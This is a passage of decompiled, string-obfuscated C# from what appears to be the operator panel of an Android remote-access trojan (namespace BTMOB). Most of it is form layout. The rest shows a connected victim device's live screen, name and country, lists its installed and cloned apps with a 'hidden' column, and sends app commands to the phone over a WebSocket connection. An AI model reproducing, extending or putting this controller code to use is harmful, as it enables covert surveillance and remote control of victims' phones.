		this.Panel3.Padding = new System.Windows.Forms.Padding(9, 10, 9, 10);
		this.Panel3.Size = new System.Drawing.Size(1202, 646);
		this.Panel3.TabIndex = 55;
		this.DrakeUITabControl1.Controls.Add(this.TabPage1);
		this.DrakeUITabControl1.Controls.Add(this.TabPage2);
		this.DrakeUITabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DrakeUITabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
		this.DrakeUITabControl1.FillColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUITabControl1.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		this.DrakeUITabControl1.ItemSize = new System.Drawing.Size(150, 40);
		this.DrakeUITabControl1.Location = new System.Drawing.Point(2, 62);
		this.DrakeUITabControl1.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
		this.DrakeUITabControl1.Name = EXGuarder._6A0D0909;
		this.DrakeUITabControl1.SelectedIndex = 0;
		this.DrakeUITabControl1.Size = new System.Drawing.Size(1202, 732);
		this.DrakeUITabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
		this.DrakeUITabControl1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUITabControl1.TabBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUITabControl1.TabIndex = 42;
		this.DrakeUITabControl1.TabSelectedColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUITabControl1.TabSelectedForeColor = System.Drawing.Color.White;
		this.DrakeUITabControl1.TabSelectedHighColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUITabControl1.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.TabPage1.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage1.Controls.Add(this.Panel3);
		this.TabPage1.Controls.Add(this.Panel35);
		this.TabPage1.Location = new System.Drawing.Point(0, 40);
		this.TabPage1.Name = EXGuarder._3015200F;
		this.TabPage1.Size = new System.Drawing.Size(1202, 692);
		this.TabPage1.TabIndex = 0;
		this.TabPage1.Text = EXGuarder._54145F36;
		this.TabPage2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.TabPage2.Controls.Add(this.DGV_CLONE);
		this.TabPage2.Controls.Add(this.Panel2);
		this.TabPage2.Location = new System.Drawing.Point(0, 40);
		this.TabPage2.Name = EXGuarder._695D1840;
		this.TabPage2.Size = new System.Drawing.Size(1202, 692);
		this.TabPage2.TabIndex = 1;
		this.TabPage2.Text = EXGuarder._3D6E402E;
		this.DGV_CLONE.AllowUserToAddRows = false;
		this.DGV_CLONE.AllowUserToDeleteRows = false;
		this.DGV_CLONE.AllowUserToResizeColumns = false;
		this.DGV_CLONE.AllowUserToResizeRows = false;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_CLONE.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle6;
		this.DGV_CLONE.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV_CLONE.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV_CLONE.BackgroundColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV_CLONE.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGV_CLONE.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV_CLONE.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
		this.DGV_CLONE.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle7.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_CLONE.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle7;
		this.DGV_CLONE.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGV_CLONE.Columns.AddRange(this.DataGridViewImageColumn1, this.DataGridViewTextBoxColumn1, this.DataGridViewTextBoxColumn3, this.appType, this.ishidnclum);
		this.DGV_CLONE.ContextMenuStrip = this.ctxclones;
		dataGridViewCellStyle8.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle8.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle8.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle8.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle8.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle8.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle8.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_CLONE.DefaultCellStyle = dataGridViewCellStyle8;
		this.DGV_CLONE.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV_CLONE.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
		this.DGV_CLONE.EnableHeadersVisualStyles = false;
		this.DGV_CLONE.GridColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DGV_CLONE.Location = new System.Drawing.Point(0, 53);
		this.DGV_CLONE.MultiSelect = false;
		this.DGV_CLONE.Name = EXGuarder._636F3053;
		this.DGV_CLONE.ReadOnly = true;
		this.DGV_CLONE.RowHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle9.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle9.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle9.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 10f, System.Drawing.FontStyle.Bold);
		dataGridViewCellStyle9.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle9.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle9.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle9.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_CLONE.RowHeadersDefaultCellStyle = dataGridViewCellStyle9;
		this.DGV_CLONE.RowHeadersVisible = false;
		this.DGV_CLONE.RowHeadersWidth = 51;
		dataGridViewCellStyle10.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle10.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle10.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle10.SelectionBackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		dataGridViewCellStyle10.SelectionForeColor = System.Drawing.Color.FromArgb(2, 176, 117);
		dataGridViewCellStyle10.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV_CLONE.RowsDefaultCellStyle = dataGridViewCellStyle10;
		this.DGV_CLONE.RowTemplate.Height = 24;
		this.DGV_CLONE.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV_CLONE.Size = new System.Drawing.Size(1202, 639);
		this.DGV_CLONE.TabIndex = 57;
		this.DataGridViewImageColumn1.FillWeight = 25f;
		this.DataGridViewImageColumn1.HeaderText = EXGuarder._78316B01;
		this.DataGridViewImageColumn1.ImageLayout = System.Windows.Forms.DataGridViewImageCellLayout.Zoom;
		this.DataGridViewImageColumn1.MinimumWidth = 6;
		this.DataGridViewImageColumn1.Name = EXGuarder._24342625;
		this.DataGridViewImageColumn1.ReadOnly = true;
		this.DataGridViewTextBoxColumn1.FillWeight = 43.06054f;
		this.DataGridViewTextBoxColumn1.HeaderText = EXGuarder._525E3331;
		this.DataGridViewTextBoxColumn1.MinimumWidth = 6;
		this.DataGridViewTextBoxColumn1.Name = EXGuarder._25310D3C;
		this.DataGridViewTextBoxColumn1.ReadOnly = true;
		this.DataGridViewTextBoxColumn3.FillWeight = 70.77698f;
		this.DataGridViewTextBoxColumn3.HeaderText = EXGuarder._51322603;
		this.DataGridViewTextBoxColumn3.MinimumWidth = 6;
		this.DataGridViewTextBoxColumn3.Name = EXGuarder._26363A41;
		this.DataGridViewTextBoxColumn3.ReadOnly = true;
		this.appType.FillWeight = 44.81415f;
		this.appType.HeaderText = EXGuarder._64351862;
		this.appType.MinimumWidth = 6;
		this.appType.Name = EXGuarder._0B49063A;
		this.appType.ReadOnly = true;
		this.ishidnclum.FillWeight = 25f;
		this.ishidnclum.HeaderText = EXGuarder._2F766D02;
		this.ishidnclum.MinimumWidth = 6;
		this.ishidnclum.Name = EXGuarder._433F744F;
		this.ishidnclum.ReadOnly = true;
		this.ctxclones.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.ctxclones.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.ctxclones.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxclones.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.OpenCloneToolStripMenuItem, this.RemoveCloneToolStripMenuItem });
		this.ctxclones.Name = EXGuarder._0171110A;
		this.ctxclones.RenderMode = System.Windows.Forms.ToolStripRenderMode.System;
		this.ctxclones.Size = new System.Drawing.Size(177, 56);
		this.OpenCloneToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.OpenCloneToolStripMenuItem.Image = BTMOB.My.Resources.Resources.open;
		this.OpenCloneToolStripMenuItem.Name = EXGuarder._33512977;
		this.OpenCloneToolStripMenuItem.Size = new System.Drawing.Size(176, 26);
		this.OpenCloneToolStripMenuItem.Text = EXGuarder._74243A06;
		this.RemoveCloneToolStripMenuItem.ForeColor = System.Drawing.Color.White;
		this.RemoveCloneToolStripMenuItem.Image = BTMOB.My.Resources.Resources.uninstall;
		this.RemoveCloneToolStripMenuItem.Name = EXGuarder._67303A29;
		this.RemoveCloneToolStripMenuItem.Size = new System.Drawing.Size(176, 26);
		this.RemoveCloneToolStripMenuItem.Text = EXGuarder._5D3E492B;
		this.Panel2.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.Panel2.Controls.Add(this.disablebtn);
		this.Panel2.Controls.Add(this.DrakeWidth_W11);
		this.Panel2.Controls.Add(this.enablebtn);
		this.Panel2.Controls.Add(this.DrakeUIButtonIcon1);
		this.Panel2.Dock = System.Windows.Forms.DockStyle.Top;
		this.Panel2.Location = new System.Drawing.Point(0, 0);
		this.Panel2.Name = EXGuarder._0A6A5B11;
		this.Panel2.Padding = new System.Windows.Forms.Padding(9, 10, 9, 10);
		this.Panel2.Size = new System.Drawing.Size(1202, 53);
		this.Panel2.TabIndex = 55;
		this.disablebtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.disablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.disablebtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.disablebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.disablebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.disablebtn.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.disablebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.disablebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.disablebtn.Location = new System.Drawing.Point(159, 10);
		this.disablebtn.Name = EXGuarder._78735E2E;
		this.disablebtn.Padding = new System.Windows.Forms.Padding(9, 10, 9, 10);
		this.disablebtn.Radius = 15;
		this.disablebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.disablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.disablebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.disablebtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.disablebtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.disablebtn.Size = new System.Drawing.Size(133, 33);
		this.disablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.disablebtn.Symbol = 61453;
		this.disablebtn.TabIndex = 53;
		this.disablebtn.Text = EXGuarder._7629450C;
		this.DrakeWidth_W11.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeWidth_W11.Dock = System.Windows.Forms.DockStyle.Left;
		this.DrakeWidth_W11.Location = new System.Drawing.Point(142, 10);
		this.DrakeWidth_W11.Name = EXGuarder._3732290F;
		this.DrakeWidth_W11.Size = new System.Drawing.Size(17, 33);
		this.DrakeWidth_W11.TabIndex = 54;
		this.enablebtn.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.enablebtn.Cursor = System.Windows.Forms.Cursors.Hand;
		this.enablebtn.Dock = System.Windows.Forms.DockStyle.Left;
		this.enablebtn.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enablebtn.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.enablebtn.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enablebtn.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enablebtn.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.enablebtn.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.enablebtn.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.enablebtn.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enablebtn.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enablebtn.ImageAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.enablebtn.Location = new System.Drawing.Point(9, 10);
		this.enablebtn.Name = EXGuarder._296E3F25;
		this.enablebtn.Padding = new System.Windows.Forms.Padding(9, 10, 9, 10);
		this.enablebtn.Radius = 15;
		this.enablebtn.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.enablebtn.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.enablebtn.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enablebtn.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.enablebtn.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.enablebtn.RectSides = System.Windows.Forms.ToolStripStatusLabelBorderSides.Bottom;
		this.enablebtn.Size = new System.Drawing.Size(133, 33);
		this.enablebtn.Style = DrakeUI.Framework.UIStyle.Custom;
		this.enablebtn.TabIndex = 52;
		this.enablebtn.Text = EXGuarder._0F423365;
		this.DrakeUIButtonIcon1.Cursor = System.Windows.Forms.Cursors.Hand;
		this.DrakeUIButtonIcon1.Dock = System.Windows.Forms.DockStyle.Right;
		this.DrakeUIButtonIcon1.FillColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillDisableColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.FillHoverColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillPressColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.FillSelectedColor = System.Drawing.Color.FromArgb(14, 22, 33);
		this.DrakeUIButtonIcon1.Font = new System.Drawing.Font(EXGuarder._5B2D6479, 9f);
		this.DrakeUIButtonIcon1.ForeColor = System.Drawing.Color.FromArgb(145, 163, 182);
		this.DrakeUIButtonIcon1.ForeHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.ForePressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.Location = new System.Drawing.Point(1044, 10);
		this.DrakeUIButtonIcon1.Name = EXGuarder._12193D2B;
		this.DrakeUIButtonIcon1.Radius = 15;
		this.DrakeUIButtonIcon1.RectColor = System.Drawing.Color.FromArgb(40, 40, 40);
		this.DrakeUIButtonIcon1.RectDisableColor = System.Drawing.Color.FromArgb(227, 242, 253);
		this.DrakeUIButtonIcon1.RectHoverColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectPressColor = System.Drawing.Color.FromArgb(2, 176, 117);
		this.DrakeUIButtonIcon1.RectSelectedColor = System.Drawing.Color.FromArgb(6, 10, 15);
		this.DrakeUIButtonIcon1.Size = new System.Drawing.Size(149, 33);
		this.DrakeUIButtonIcon1.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DrakeUIButtonIcon1.Symbol = 61473;
		this.DrakeUIButtonIcon1.TabIndex = 47;
		this.DrakeUIButtonIcon1.Text = EXGuarder._0B1D0119;
		base.AutoScaleDimensions = new System.Drawing.SizeF(8f, 18f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		this.BackColor = System.Drawing.Color.FromArgb(6, 10, 15);
		base.ClientSize = new System.Drawing.Size(1206, 796);
		base.Controls.Add(this.DrakeUITabControl1);
		base.Icon = (System.Drawing.Icon)resources.GetObject(EXGuarder._6147714C);
		base.Name = EXGuarder._74701D23;
		this.Text = EXGuarder._75714477;
		base.Controls.SetChildIndex(this.tobpanelsti, 0);
		base.Controls.SetChildIndex(this.DrakeUITabControl1, 0);
		((System.ComponentModel.ISupportInitialize)this.myscr).EndInit();
		((System.ComponentModel.ISupportInitialize)this.myico).EndInit();
		this.tobpanelsti.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV0).EndInit();
		this.ctxapps.ResumeLayout(false);
		this.Panel35.ResumeLayout(false);
		this.Panel3.ResumeLayout(false);
		this.DrakeUITabControl1.ResumeLayout(false);
		this.TabPage1.ResumeLayout(false);
		this.TabPage2.ResumeLayout(false);
		((System.ComponentModel.ISupportInitialize)this.DGV_CLONE).EndInit();
		this.ctxclones.ResumeLayout(false);
		this.Panel2.ResumeLayout(false);
		base.ResumeLayout(false);
	}

	public AppsManager()
	{
		base.Load += AppsManager_Load;
		base.FormClosing += AppsManager_FormClosing;
		InitializeComponent();
	}

	private void translateme()
	{
		object value = BTRegistry.GetValue(EXGuarder._645C5852, EXGuarder._4F4B501C);
		if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._5D69071E, TextCompare: false))
		{
			refbtm.Text = EXGuarder._69204D6F;
			ctxapps.Items[0].Text = EXGuarder._37526F3A;
			ctxapps.Items[2].Text = EXGuarder._2D195D44;
			ctxapps.Items[3].Text = EXGuarder._3340103D;
			ctxapps.Items[5].Text = EXGuarder._0B632E2C;
			ctxapps.Items[6].Text = EXGuarder._20336111;
			ctxapps.Items[8].Text = EXGuarder._50313E6D;
			ctxapps.Items[9].Text = EXGuarder._756E6D71;
			ctxapps.Items[11].Text = EXGuarder._6B282223;
			searchtext.Watermark = EXGuarder._435B602F;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._6670300D, TextCompare: false))
		{
			refbtm.Text = EXGuarder._4E087430;
			ctxapps.Items[0].Text = EXGuarder._2F621E38;
			ctxapps.Items[2].Text = EXGuarder._58771B12;
			ctxapps.Items[3].Text = EXGuarder._556B051A;
			ctxapps.Items[5].Text = EXGuarder._46656769;
			ctxapps.Items[6].Text = EXGuarder._08215478;
			ctxapps.Items[8].Text = EXGuarder._09761D3E;
			ctxapps.Items[9].Text = EXGuarder._76013128;
			ctxapps.Items[11].Text = EXGuarder._5A3F6A5B;
			searchtext.Watermark = EXGuarder._1D184968;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._54772875, TextCompare: false))
		{
			refbtm.Text = EXGuarder._23292A57;
			ctxapps.Items[0].Text = EXGuarder._561B0307;
			ctxapps.Items[2].Text = EXGuarder._385C631E;
			ctxapps.Items[3].Text = EXGuarder._321F2E0B;
			ctxapps.Items[5].Text = EXGuarder._68655422;
			ctxapps.Items[6].Text = EXGuarder._5F532C08;
			ctxapps.Items[8].Text = EXGuarder._770D2B34;
			ctxapps.Items[9].Text = EXGuarder._37551354;
			ctxapps.Items[11].Text = EXGuarder._416C3E2E;
			searchtext.Watermark = EXGuarder._31710F50;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._446D1604, TextCompare: false))
		{
			refbtm.Text = EXGuarder._246B0223;
			ctxapps.Items[0].Text = EXGuarder._2A437510;
			ctxapps.Items[2].Text = EXGuarder._42390542;
			ctxapps.Items[3].Text = EXGuarder._545E371F;
			ctxapps.Items[5].Text = EXGuarder._36000F5F;
			ctxapps.Items[6].Text = EXGuarder._720E3B36;
			ctxapps.Items[8].Text = EXGuarder._01493778;
			ctxapps.Items[9].Text = EXGuarder._1B5A4C19;
			ctxapps.Items[11].Text = EXGuarder._42185E38;
			searchtext.Watermark = EXGuarder._6611443E;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._4B5C5833, TextCompare: false))
		{
			refbtm.Text = EXGuarder._27200E48;
			ctxapps.Items[0].Text = EXGuarder._592F591F;
			ctxapps.Items[2].Text = EXGuarder._0363146F;
			ctxapps.Items[3].Text = EXGuarder._161F5453;
			ctxapps.Items[5].Text = EXGuarder._45056A4B;
			ctxapps.Items[6].Text = EXGuarder._52264064;
			ctxapps.Items[8].Text = EXGuarder._63125A06;
			ctxapps.Items[9].Text = EXGuarder._1B314B15;
			ctxapps.Items[11].Text = EXGuarder._240E041D;
			searchtext.Watermark = EXGuarder._54622B50;
		}
		else if (Operators.ConditionalCompareObjectEqual(value, EXGuarder._105E0605, TextCompare: false))
		{
			refbtm.Text = EXGuarder._324C3B5E;
			ctxapps.Items[0].Text = EXGuarder._4534484C;
			ctxapps.Items[2].Text = EXGuarder._1B127741;
			ctxapps.Items[3].Text = EXGuarder._4F264A13;
			ctxapps.Items[5].Text = EXGuarder._3A14720A;
			ctxapps.Items[6].Text = EXGuarder._50365417;
			ctxapps.Items[8].Text = EXGuarder._63125A06;
			ctxapps.Items[9].Text = EXGuarder._1B314B15;
			ctxapps.Items[11].Text = EXGuarder._240E041D;
			searchtext.Watermark = EXGuarder._0E3C4235;
		}
	}

	private void DataGridView1_CellPainting(object sender, DataGridViewCellPaintingEventArgs e)
	{
		DataGridView dataGridView = (DataGridView)sender;
		if (e.RowIndex < 0 || e.ColumnIndex < 0)
		{
			return;
		}
		e.Handled = true;
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Rectangle cellBounds = e.CellBounds;
		cellBounds.Inflate(0, -2);
		using (SolidBrush brush = new SolidBrush(Color.FromArgb(6, 10, 15)))
		{
			e.Graphics.FillRectangle(brush, e.CellBounds);
		}
		int radius = 15;
		GraphicsPath graphicsPath = null;
		int columnIndex = e.ColumnIndex;
		checked
		{
			int num = dataGridView.ColumnCount - 1;
			if (columnIndex == 0)
			{
				DGV0.Rows[e.RowIndex].Cells[0].Style.Padding = new Padding(0);
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: true, roundTopRight: false, roundBottomRight: false);
			}
			else if (columnIndex == num)
			{
				graphicsPath = codes.GetRoundedRectanglePath(cellBounds, radius, roundTopLeft: false, roundTopRight: true, roundBottomRight: true, roundBottomLeft: false);
			}
			else
			{
				graphicsPath = new GraphicsPath();
				graphicsPath.AddRectangle(cellBounds);
			}
			Color color = default(Color);
			Color foreColor;
			if (dataGridView.Rows[e.RowIndex].Selected)
			{
				color = Color.FromArgb(14, 22, 33);
				foreColor = Color.FromArgb(2, 176, 117);
			}
			else
			{
				Color foreColor2 = dataGridView.Rows[e.RowIndex].Cells[e.ColumnIndex].Style.ForeColor;
				foreColor = ((!foreColor2.IsEmpty) ? foreColor2 : Color.FromArgb(145, 163, 182));
			}
			using (SolidBrush brush2 = new SolidBrush(color))
			{
				using Pen pen = new Pen(color);
				e.Graphics.FillPath(brush2, graphicsPath);
				e.Graphics.DrawPath(pen, graphicsPath);
			}
			if (e.Value != null && e.Value is Image)
			{
				Image image = (Image)e.Value;
				Rectangle rect = new Rectangle(cellBounds.X + unchecked(checked(cellBounds.Width - image.Width) / 2), cellBounds.Y + unchecked(checked(cellBounds.Height - image.Height) / 2), image.Width, image.Height);
				e.Graphics.DrawImage(image, rect);
			}
			else if (e.Value != null)
			{
				TextRenderer.DrawText(e.Graphics, e.FormattedValue.ToString(), e.CellStyle.Font, cellBounds, foreColor, TextFormatFlags.HorizontalCenter | TextFormatFlags.VerticalCenter | TextFormatFlags.WordBreak);
			}
		}
	}

	private void AppsManager_Load(object sender, EventArgs e)
	{
		myico.Image = Btcli.wallpaper;
		myscr.Image = Btcli.screen;
		ctxapps.Renderer = new MyRenderer();
		ctxclones.Renderer = new MyRenderer();
		codes.SetDoubleBuffered(DGV0);
		translateme();
		statetimer.Start();
	}

	private void statetimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (Btcli.isConnected)
			{
				myscr.Image = Btcli.screen;
				myico.Image = Btcli.wallpaper;
				mytitle.Text = BTConst.Appsstr + EXGuarder._736D4452 + Btcli.name + EXGuarder._736D4452 + Btcli.country;
			}
			else
			{
				myico.Image = Resources.no_con;
				myscr.Image = null;
				mytitle.Text = BTConst.Appsstr + EXGuarder._736D4452 + BTConst.Disconnectedstr;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			ProjectData.ClearProjectError();
		}
	}

	private void AppsManager_FormClosing(object sender, FormClosingEventArgs e)
	{
		statetimer.Stop();
	}

	private void searchtext_TextChanged(object sender, EventArgs e)
	{
		if (!string.IsNullOrEmpty(searchtext.Text))
		{
			emptysearch.Visible = true;
			trysearch();
		}
		else
		{
			emptysearch.Visible = false;
			ShowAllRows();
		}
	}

	public void trysearch()
	{
		if (DGV0.Rows.Count < 1 || string.IsNullOrEmpty(searchtext.Text))
		{
			return;
		}
		string value = searchtext.Text.ToLower();
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			try
			{
				if (item.Cells[1].Value.ToString().ToLower().Contains(value) || item.Cells[2].Value.ToString().ToLower().Contains(value) || item.Cells[3].Value.ToString().ToLower().Contains(value) || item.Cells[4].Value.ToString().ToLower().Contains(value))
				{
					item.Visible = true;
				}
				else
				{
					item.Visible = false;
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ShowAllRows()
	{
		foreach (DataGridViewRow item in (IEnumerable)DGV0.Rows)
		{
			item.Visible = true;
		}
	}

	private void emptysearch_Click(object sender, EventArgs e)
	{
		searchtext.Text = EXGuarder._04266C66;
	}

	private void ClearAllToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._18660068, appid);
				string value = BTCommand.FormatCommand(EXGuarder._15725908, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._79702841, BTConst.wrk);
				dictionary.Add(EXGuarder._2F6D5E59, value);
				Dictionary<string, object> chatData = dictionary;
				BTEngine.commands(chatData, Btcli.mobid, Btcli.Serverins.WSClient);
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				ProjectData.ClearProjectError();
			}
		}
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (DGV0.Rows.Count <= 0 || DGV0.SelectedRows.Count <= 0)
		{
			return;
		}
		foreach (DataGridViewRow selectedRow in DGV0.SelectedRows)
		{
			try
			{
				string appid = selectedRow.Tag.ToString();
				VB_0024AnonymousType_13<string, string> data = new VB_0024AnonymousType_13<string, string>(EXGuarder._1926793A, appid);
				string value = BTCommand.FormatCommand(EXGuarder._0E5B2F66, data);
				Dictionary<string, object> dictionary = new Dictionary<string, object>();
				dictionary.Add(EXGuarder._3F257811, BTConst.wrk);
				dictionary.Add(EXGuarder._4A501103, value);
				Dictionary<string, object> chatData = dictionary;
